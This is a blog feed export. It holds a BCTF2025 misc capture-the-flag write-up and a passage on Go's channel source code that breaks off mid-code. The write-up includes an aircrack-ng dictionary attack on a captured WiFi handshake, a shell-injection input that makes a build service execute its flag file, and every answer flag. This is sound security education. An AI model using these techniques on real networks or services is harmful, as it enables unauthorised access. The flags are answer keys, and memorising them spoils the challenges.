{
    "version": "https://jsonfeed.org/version/1",
    "title": "十二的编程笔记",
    "subtitle": "hello world",
    "icon": "https://blog.twelveeee.top/images/favicon.ico",
    "description": "十二的编程笔记",
    "home_page_url": "https://blog.twelveeee.top",
    "items": [
        {
            "id": "https://blog.twelveeee.top/2025/CTF/BCTF2025/misc_01/",
            "url": "https://blog.twelveeee.top/2025/CTF/BCTF2025/misc_01/",
            "title": "BCTF2025-MISC-01~08",
            "date_published": "2025-08-25T11:00:00.000Z",
            "content_html": "<h1 id=\"misc-01~08\"><a class=\"anchor\" href=\"#misc-01~08\">#</a> MISC-01~08</h1>\n<h2 id=\"皮卡丘\"><a class=\"anchor\" href=\"#皮卡丘\">#</a> 皮卡丘</h2>\n<p>题目</p>\n<blockquote>\n<p>flag 格式：flag {37 位字符} 附件链接： [皮卡丘.jpg]</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNS8lRTclOUElQUUlRTUlOEQlQTElRTQlQjglOTguanBn\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2025 / 皮卡丘.jpg</span></p>\n</blockquote>\n<details class=\"success\"><summary>题解</summary><div>\n<p>考察内容：文件格式分析、图片隐写、 <code>binwalk</code>  提取文件、压缩包隐藏。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>binwalk <span class=\"token parameter variable\">-e</span> 皮卡丘.jpg </pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>DECIMAL       HEXADECIMAL     DESCRIPTION</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>--------------------------------------------------------------------------------</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">0</span>             0x0             JPEG image data, JFIF standard <span class=\"token number\">1.01</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">27162</span>         0x6A1A          Zip archive data, at least v2.0 to extract, compressed size: <span class=\"token number\">60</span>, uncompressed size: <span class=\"token number\">64</span>, name: FLAG.txt</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">27350</span>         0x6AD6          End of Zip archive, footer length: <span class=\"token number\">22</span></pre></td></tr></table></figure></div></details>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{@Harry__dalaodalao_ballball_daidai_wo}</span></p>\n</div></details>\n<h2 id=\"捉迷藏\"><a class=\"anchor\" href=\"#捉迷藏\">#</a> 捉迷藏</h2>\n<p>题目</p>\n<blockquote>\n<p>你能发现我吗。</p>\n<p>附件链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNS9jaGFsbGVuZ2UudHh0\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2025/challenge.txt</span></p>\n</blockquote>\n<details class=\"success\"><summary>题解</summary><div>\n<p>考察内容：零宽字符隐写</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYXp6emFyby5naXRodWIuaW8vMjAyMC8wNS8yNC9taXNjLSVFOSU5QiVCNiVFNSVBRSVCRCVFNSVCQSVBNiVFNSVBRCU5NyVFNyVBQyVBNiVFOSU5QSU5MCVFNSU4NiU5OS9pbmRleC5odG1s\">https://lazzzaro.github.io/2020/05/24/misc - 零宽度字符隐写 /index.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly8zMzBrLmdpdGh1Yi5pby9taXNjX3Rvb2xzL3VuaWNvZGVfc3RlZ2Fub2dyYXBoeS5odG1s\">https://330k.github.io/misc_tools/unicode_steganography.html</span></p>\n<p>选</p>\n<p><code>U+202C POP DIRECTIONAL FORMATTING</code></p>\n<p><code>U+FEFF ZERO WIDTH NO-BREAK SPACE</code></p>\n</div></details>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{398649588fe56617b32b6850db7f7134}</span></p>\n</div></details>\n<h2 id=\"蹭网\"><a class=\"anchor\" href=\"#蹭网\">#</a> 蹭网</h2>\n<p>题目</p>\n<blockquote>\n<p>flag 格式：flag {你破解的 WiFi 密码} 附件链接： [tips.txt wifi.cap zidian.txt]</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNS93aWZpLmNhcA==\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2025/wifi.cap</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNS96aWRpYW4udHh0\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2025/zidian.txt</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNS90aXBzLnR4dA==\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2025/tips.txt</span></p>\n</blockquote>\n<details class=\"success\"><summary>题解</summary><div>\n<p>考察内容：无线网络安全、 <code>.cap</code>  抓包文件分析、WiFi WPA/WPA2 密钥破解</p>\n<p>安装 Aircrack-ng</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>brew <span class=\"token function\">install</span> aircrack-ng</pre></td></tr></table></figure><p>使用 Aircrack-ng  破解 wifi.cap 文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>aircrack-ng <span class=\"token parameter variable\">-w</span> zidian.txt wifi.cap</pre></td></tr></table></figure></div></details>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{13910407686}</span></p>\n</div></details>\n<h2 id=\"中国菜刀\"><a class=\"anchor\" href=\"#中国菜刀\">#</a> 中国菜刀</h2>\n<p>题目</p>\n<blockquote>\n<p>flag 格式：key {32 位字符} 附件链接：[caidao.zip]</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNS9jYWlkYW8uemlw\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2025/caidao.zip</span></p>\n</blockquote>\n<details class=\"success\"><summary>题解</summary><div>\n<p>考察内容：流量取证、 <code>pcapng</code>  文件分析</p>\n<p>使用 wireshark 分析，发现有个 txt 文件在包里</p>\n<p><img data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/image-20250825173047191.png\" alt=\"image-20250825173047191\" /></p>\n<p>直接用菜刀</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>% binwalk <span class=\"token parameter variable\">-e</span> caidao.pcapng</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>DECIMAL       HEXADECIMAL     DESCRIPTION</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>--------------------------------------------------------------------------------</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">7747</span>          0x1E43          <span class=\"token function\">gzip</span> compressed data, from Unix, last modified: <span class=\"token number\">2016</span>-06-27 08:44:39</pre></td></tr></table></figure><p>找到 flag</p>\n</div></details>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">key{8769fe393f2b998fa6a11afe2bfcd65e}</span></p>\n</div></details>\n<h2 id=\"bin文件解析\"><a class=\"anchor\" href=\"#bin文件解析\">#</a> bin 文件解析</h2>\n<p>题目</p>\n<blockquote>\n<p>bin 文件解析</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNS9oZWxsby5iaW4=\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2025/hello.bin</span></p>\n</blockquote>\n<details class=\"success\"><summary>题解</summary><div>\n<p>考察内容：二进制文件解析、字符串提取、十六进制数据解码</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>string hello.bin</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>取到 666c61677b62343533343738386230356233353035363138373134326634396331356332357d</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>进行bash16</pre></td></tr></table></figure></div></details>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">key{b4534788b05b35056187142f49c15c25}</span></p>\n</div></details>\n<h2 id=\"bilibili\"><a class=\"anchor\" href=\"#bilibili\">#</a> BILIBILI</h2>\n<p>题目</p>\n<blockquote>\n<p>flag 就在里面，flag 格式：flag {17 位字符} 附件链接： [bilibili.zip Stegsolve.jar]</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNS9iaWxpYmlsaS56aXA=\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2025/bilibili.zip</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RleDJlL3N0ZWdzb2x2ZS1tYWNvcw==\">https://github.com/tex2e/stegsolve-macos</span></p>\n</blockquote>\n<details class=\"success\"><summary>题解</summary><div>\n<p>考察内容：图片隐写、Stegsolve 图像平面分析、Unicode 编码隐写</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">java</span> <span class=\"token parameter variable\">-jar</span> Stegsolve.jar</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>找到 FLAG<span class=\"token punctuation\">&#123;</span>（下）MoSen00x1<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>只有一半flag</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>binwalk <span class=\"token parameter variable\">-e</span> flagg.bmp</pre></td></tr></table></figure><p>找到<br />\n %5cu0066%5cu006c%5cu0061%5cu0067%5cu007b%5cu006d%5cu0061%5cu0064%5cu0065%5cu0065%5cu0062%5cu0062%5cu0079<br />\n 解析后为<br />\n \\u0066\\u006c\\u0061\\u0067\\u007b\\u006d\\u0061\\u0064\\u0065\\u0065\\u0062\\u0062\\u0079</p>\n<p>再 unicode 解码 得出</p>\n<p>flag{madeebby</p>\n</div></details>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{madeebbyMoSen00x1}</span></p>\n</div></details>\n<h2 id=\"make-maker\"><a class=\"anchor\" href=\"#make-maker\">#</a> Make Maker</h2>\n<p>题目</p>\n<blockquote>\n<p>nc <span class=\"exturl\" data-url=\"aHR0cDovL2V4YW1wbGUuY29t\">example.com</span> 8181 你会 make make 吗？</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNS9NYWtlTWFrZXJNYWluLnB5\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2025/MakeMakerMain.py</span></p>\n</blockquote>\n<details class=\"success\"><summary>题解</summary><div>\n<p>考察内容：Pwn/Misc 混合题，利用  <code>make</code>  构建过程 &amp; shell 注入、特殊字符绕过、命令执行</p>\n<p>不允许输入 ascii 和 数字</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>% <span class=\"token function\">nc</span> example.com <span class=\"token number\">8181</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">##     ##    ###    ##    ## ######## ##     ##    ###    ##    ## ######## ########  </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">###   ###   ## ##   ##   ##  ##       ###   ###   ## ##   ##   ##  ##       ##     ## </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#### ####  ##   ##  ##  ##   ##       #### ####  ##   ##  ##  ##   ##       ##     ## </span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">## ### ## ##     ## #####    ######   ## ### ## ##     ## #####    ######   ########  </span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">##     ## ######### ##  ##   ##       ##     ## ######### ##  ##   ##       ##   ##   </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">##     ## ##     ## ##   ##  ##       ##     ## ##     ## ##   ##  ##       ##    ##  </span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">##     ## ##     ## ##    ## ######## ##     ## ##     ## ##    ## ######## ##     ## </span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>You can input a target name and the content</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>I will <span class=\"token keyword\">do</span> my best to <span class=\"token function\">make</span> it <span class=\"token keyword\">for</span> you</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Target name: -</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Content: <span class=\"token builtin class-name\">.</span>      ./*</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>-: </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token builtin class-name\">.</span>       ./*</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>stdout:</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token builtin class-name\">.</span>       ./*</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>stderr:</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>/bin/sh: ./flag.txt: line <span class=\"token number\">1</span>: flag<span class=\"token punctuation\">&#123;</span>092e166158f1d946e6714dd202341ec0<span class=\"token punctuation\">&#125;</span>: not found</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>make: *** <span class=\"token punctuation\">[</span>/tmp/GmOCHkjp:2: -<span class=\"token punctuation\">]</span> Error <span class=\"token number\">127</span></pre></td></tr></table></figure></div></details>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{092e166158f1d946e6714dd202341ec0}</span></p>\n</div></details>\n<h2 id=\"一张很白的图片\"><a class=\"anchor\" href=\"#一张很白的图片\">#</a> 一张很白的图片</h2>\n<p>题目</p>\n<blockquote>\n<p>人类的眼睛只能识别一部分颜色的变化</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2VsdmVlZWUtbm90ZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vZmlsZS9iY3RmMjAyNS9sc2IzLnBuZw==\">https://twelveeee-note.oss-cn-beijing.aliyuncs.com/file/bctf2025/lsb3.png</span></p>\n</blockquote>\n<details class=\"success\"><summary>题解</summary><div>\n<p>考察内容：LSB、图像数据分析</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MDU5NzE2Njc=\">https://zhuanlan.zhihu.com/p/605971667</span></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>img <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"lsb3.png\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>pixels <span class=\"token operator\">=</span> img<span class=\"token punctuation\">.</span>getdata<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>bits <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> p <span class=\"token keyword\">in</span> pixels<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># RGBA</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> channel <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># RGB 三通道</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        bits <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>channel <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 取最低位</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 每 8 个 bit 转成字符</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    byte <span class=\"token operator\">=</span> bits<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">8</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure></div></details>\n<details class=\"warning\"><summary>答案</summary><div>\n<p><span class=\"spoiler bulr\" title=\"你知道得太多了\">flag{d05d2dd6a97e54cfbff76c582a07cf32}</span></p>\n</div></details>\n",
            "tags": [
                "计算机科学",
                "CTF",
                "BCTF2025",
                "CTF"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2025/Go/Lib/channel/",
            "url": "https://blog.twelveeee.top/2025/Go/Lib/channel/",
            "title": "golang 标准库源码解析 - channel",
            "date_published": "2025-08-05T12:00:00.000Z",
            "content_html": "<blockquote>\n<p>本文源码版本基于 go1.21.13</p>\n</blockquote>\n<h1 id=\"channel\"><a class=\"anchor\" href=\"#channel\">#</a> channel</h1>\n<p>Golang 中使用 CSP 中 channel 的概念。channel 是被单独创建并且可以在进程之间传递，它的通信模式类似于 boss-worker 模式，一个实体通过将消息发送到 channel 中，然后由监听这个 channel 的实体处理，两个实体之间是没有互相感知的，这个就实现实体之间的解耦。</p>\n<h2 id=\"chan结构\"><a class=\"anchor\" href=\"#chan结构\">#</a> chan 结构</h2>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> hchan <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tqcount   <span class=\"token builtin\">uint</span>           <span class=\"token comment\">//buffer 中已放入的元素个数</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tdataqsiz <span class=\"token builtin\">uint</span>           <span class=\"token comment\">// 用户构造 channel 时指定的 buf 大小</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tbuf      unsafe<span class=\"token punctuation\">.</span>Pointer <span class=\"token comment\">// buffer</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\telemsize <span class=\"token builtin\">uint16</span>         <span class=\"token comment\">//buffer 中每个元素的大小</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tclosed   <span class=\"token builtin\">uint32</span>         <span class=\"token comment\">//channel 是否关闭，== 0 代表未 closed</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\telemtype <span class=\"token operator\">*</span>_type         <span class=\"token comment\">//channel 元素的类型信息</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tsendx    <span class=\"token builtin\">uint</span>           <span class=\"token comment\">//buffer 中已发送的索引位置 send index</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\trecvx    <span class=\"token builtin\">uint</span>           <span class=\"token comment\">//buffer 中已接收的索引位置 receive index</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\trecvq    waitq          <span class=\"token comment\">// 等待接收的 goroutine  list of recv waiters</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tsendq    waitq          <span class=\"token comment\">// 等待发送的 goroutine list of send waiters</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tlock mutex</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">type</span> waitq <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tfirst <span class=\"token operator\">*</span>sudog</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tlast  <span class=\"token operator\">*</span>sudog</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"初始化\"><a class=\"anchor\" href=\"#初始化\">#</a> 初始化</h2>\n<p>如果当前 channel 中不存在缓冲区，那么就只会为 hchan 分配一段内存空间；</p>\n<p>如果当前 channel 中存储的类型不是指针类型，就会直接为当前的 Channel 和底层的数组分配一块连续的内存空间；</p>\n<p>在默认情况下会单独为 hchan 和 buff 分配内存；</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">makechan</span><span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>chantype<span class=\"token punctuation\">,</span> size <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>hchan <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\telem <span class=\"token operator\">:=</span> t<span class=\"token punctuation\">.</span>Elem</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// compiler checks this but be safe.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">if</span> elem<span class=\"token punctuation\">.</span>Size_ <span class=\"token operator\">>=</span> <span class=\"token number\">1</span><span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">16</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// 元素大小超过限制，抛出异常</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token function\">throw</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"makechan: invalid channel element type\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">if</span> hchanSize<span class=\"token operator\">%</span>maxAlign <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> elem<span class=\"token punctuation\">.</span>Align_ <span class=\"token operator\">></span> maxAlign <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">// 确保合理的对齐</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token function\">throw</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"makechan: bad alignment\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">// 计算内存大小，并检查是否溢出</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tmem<span class=\"token punctuation\">,</span> overflow <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">MulUintptr</span><span class=\"token punctuation\">(</span>elem<span class=\"token punctuation\">.</span>Size_<span class=\"token punctuation\">,</span> <span class=\"token function\">uintptr</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">if</span> overflow <span class=\"token operator\">||</span> mem <span class=\"token operator\">></span> maxAlloc<span class=\"token operator\">-</span>hchanSize <span class=\"token operator\">||</span> size <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span><span class=\"token function\">plainError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"makechan: size out of range\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token comment\">// 如果 buff 中的元素不包含指针， Hchan 对 GC 来说并不重要。(如果缓冲区中的元素不包含指针，那么这些元素就不需要被垃圾回收器扫描。)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token comment\">// 缓冲区指向相同的分配区，并且元素类型是持久的。 （大概意思是不会被垃圾回收？）</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token comment\">// TODO: 重新考虑何时收集器可以移动已分配的对象。</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token keyword\">var</span> c <span class=\"token operator\">*</span>hchan</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">case</span> mem <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token comment\">// 队列或元素的大小为零。</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\tc <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>hchan<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token function\">mallocgc</span><span class=\"token punctuation\">(</span>hchanSize<span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 